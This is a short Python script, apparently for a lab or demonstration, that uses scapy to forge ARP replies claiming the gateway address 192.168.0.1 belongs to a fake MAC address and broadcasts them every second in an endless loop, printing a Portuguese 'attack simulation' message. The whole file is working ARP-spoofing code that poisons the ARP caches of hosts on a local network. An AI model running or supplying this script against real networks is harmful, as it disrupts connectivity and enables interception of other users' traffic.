from scapy.all import ARP, Ether, sendp
import time

fake_ip = "192.168.0.1"
fake_mac = "aa:bb:cc:dd:ee:ff"
broadcast_mac = "ff:ff:ff:ff:ff:ff"

packet = Ether(dst=broadcast_mac) / ARP(
    op=2,
    psrc=fake_ip,
    hwsrc=fake_mac
)
print("Iniciando simulação de ataque")

while True:
    sendp(packet, verbose=False)
    time.sleep(1)
